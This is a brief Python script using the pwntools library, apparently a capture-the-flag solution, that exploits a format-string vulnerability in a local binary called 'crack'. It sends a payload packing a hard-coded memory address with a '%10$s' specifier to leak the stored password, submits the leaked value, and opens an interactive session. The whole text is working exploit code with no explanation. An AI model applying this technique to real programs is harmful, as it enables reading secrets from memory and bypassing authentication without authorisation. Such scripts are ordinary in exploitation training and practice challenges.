#coding=utf-8
from pwn import *
p=process('./crack')
 
password_addr=0x0804A048
 
p.recvuntil("name ?")
payload=p32(password_addr)+"#"+"%10$s"+"#"
p.sendline(payload)
p.recvuntil("#")
io=p.recvuntil("#")
 
password=u32(io[:4])
p.recvuntil("password :")
p.sendline(str(password))
p.interactive()
